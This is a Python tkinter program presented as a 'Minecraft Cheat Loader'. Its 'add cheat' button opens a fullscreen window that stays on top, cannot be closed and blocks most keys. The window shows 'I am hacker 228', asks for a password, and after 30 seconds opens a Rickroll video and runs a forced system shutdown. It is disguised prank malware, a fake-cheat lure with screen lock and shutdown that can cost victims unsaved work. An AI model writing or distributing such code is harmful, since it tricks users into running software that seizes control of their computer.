import tkinter as tk
from tkinter import messagebox
import webbrowser
import os
import sys
import traceback

def create_main_window():
    try:
        # Главное окно с дизайном Minecraft
        window = tk.Tk()
        window.title("Minecraft Cheat Loader")
        window.geometry("400x300")
        window.configure(bg='#4CAF50')  # Зеленый фон в стиле Minecraft
        window.resizable(False, False)

        # Заголовок
        title_label = tk.Label(
            window,
            text="Minecraft Cheat Loader",
            font=("Arial", 20, "bold"),
            fg='white',
            bg='#4CAF50'
        )
        title_label.pack(pady=20)

        # Описание
        desc_label = tk.Label(
            window,
            text="Загрузите лучший чит для Minecraft!\nНажмите, чтобы добавить X-Ray или Fly!",
            font=("Arial", 12),
            fg='white',
            bg='#4CAF50',
            justify='center'
        )
        desc_label.pack(pady=10)

        def open_hacker_window():
            window.destroy()  # Закрываем главное окно
            create_hacker_window()

        # Кнопка "Добавить чит"
        cheat_button = tk.Button(
            window,
            text="Добавить чит",
            font=("Arial", 14, "bold"),
            fg='white',
            bg='#2E7D32',  # Темно-зеленый в стиле Minecraft
            activebackground='#1B5E20',
            command=open_hacker_window
        )
        cheat_button.pack(pady=20)

        window.mainloop()
    except Exception as e:
        print(f"Ошибка при создании главного окна: {e}")
        traceback.print_exc()
        input("Нажмите Enter, чтобы закрыть консоль...")

def create_hacker_window():
    try:
        # Создаем хакерское окно
        hacker_window = tk.Tk()
        hacker_window.title("Взлом")
        hacker_window.attributes('-fullscreen', True)  # Полноэкранный режим
        hacker_window.attributes('-topmost', True)  # Окно поверх всех
        hacker_window.configure(bg='black')  # Черный фон

        # Отключаем Alt+F4
        def block_close():
            pass  # Ничего не делаем при попытке закрытия
        hacker_window.protocol("WM_DELETE_WINDOW", block_close)

        # Переменная для анимации
        blink_state = True

        def blink_text():
            nonlocal blink_state
            if blink_state:
                label.config(fg='red')
            else:
                label.config(fg='white')
            blink_state = not blink_state
            hacker_window.after(500, blink_text)  # Повтор каждые 500 мс

        # Таймер (30 секунд)
        timer_seconds = 30
        timer_label = tk.Label(
            hacker_window,
            text=f"Осталось: {timer_seconds} сек",
            font=("Courier", 18),
            fg='yellow',
            bg='black'
        )
        timer_label.pack(pady=20)

        def update_timer(seconds_left):
            if seconds_left > 0:
                timer_label.config(text=f"Осталось: {seconds_left} сек")
                hacker_window.after(1000, update_timer, seconds_left - 1)
            else:
                # Время вышло: открываем Рик Ролл и выключаем компьютер
                try:
                    webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
                    os.system("shutdown /s /t 12")  # Выключение через 3 секунды
                except Exception as e:
                    print(f"Ошибка при открытии видео или выключении: {e}")
                hacker_window.destroy()

        # Текст "Я взломщик 228"
        label = tk.Label(
            hacker_window,
            text="Я взломщик 228",
            font=("Courier", 48, "bold"),
            fg='red',
            bg='black'
        )
        label.pack(pady=50)

        # Поле ввода пароля
        password_label = tk.Label(
            hacker_window,
            text="Введите пароль:",
            font=("Courier", 24),
            fg='white',
            bg='black'
        )
        password_label.pack(pady=20)

        password_entry = tk.Entry(hacker_window, show="*", font=("Courier", 24), width=10)
        password_entry.pack(pady=20)
        password_entry.focus_set()  # Фокус на поле ввода

        def check_password():
            try:
                if password_entry.get() == "12345":
                    hacker_window.destroy()  # Закрываем окно
                else:
                    messagebox.showerror("Ошибка", "Неверный пароль!")
                    password_entry.delete(0, tk.END)  # Очищаем поле ввода
            except Exception as e:
                print(f"Ошибка при проверке пароля: {e}")

        # Кнопка для проверки пароля
        submit_button = tk.Button(
            hacker_window,
            text="Ввести",
            font=("Courier", 18),
            fg='white',
            bg='darkred',
            command=check_password
        )
        submit_button.pack(pady=20)

        # Запускаем анимацию и таймер
        blink_text()
        update_timer(timer_seconds)

        # Обработка Enter для ввода пароля
        password_entry.bind('<Return>', lambda event: check_password())

        # Блокируем другие комбинации клавиш
        def block_keys(event):
            allowed_keys = ('Return', 'BackSpace', 'Delete', 'Left', 'Right')
            if event.keysym not in allowed_keys and not event.char.isalnum():
                return "break"  # Блокируем остальные клавиши

        hacker_window.bind('<Key>', block_keys)

        hacker_window.mainloop()
    except Exception as e:
        print(f"Ошибка при создании хакерского окна: {e}")
        traceback.print_exc()
        input("Нажмите Enter, чтобы закрыть консоль...")

if __name__ == "__main__":
    try:
        print("Запуск программы...")
        create_main_window()
    except Exception as e:
        print(f"Критическая ошибка: {e}")
        traceback.print_exc()
        input("Нажмите Enter, чтобы закрыть консоль...")